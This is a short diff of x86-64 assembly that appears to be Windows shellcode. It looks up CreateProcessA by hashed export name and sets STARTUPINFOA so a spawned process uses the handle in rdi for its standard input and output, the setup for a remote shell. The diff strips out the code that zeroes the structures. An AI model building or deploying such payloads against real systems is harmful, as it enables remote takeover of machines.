@@ -144,23 +144,13 @@ setup_proc:
     mov r11d, 0x16B3FE72    ; CreateProcessA
     jmp kernel32.resolve_export
 createprocessa:
-    mov r11, rdi
     sub rsp, 136    ; STARTUPINFOA + PROCESS_INFORMATION
-    mov r10, rax
-    xor rax, rax
-    mov rdi, rsp
-    cld
-    mov rcx, 136
-    rep stosb        ; ZERO OUT BOTH STRUCTS
-    mov rax, r10
-    mov rdi, r11
     mov dword [rsp], 112
     mov dword [rsp+60], 0x00000100
     mov qword [rsp+80], rdi
     mov qword [rsp+88], rdi
     mov qword [rsp+96], rdi
     mov r14, rsp 
-    ; add rsp, 136
 
     sub rsp, 88
     xor rcx, rcx
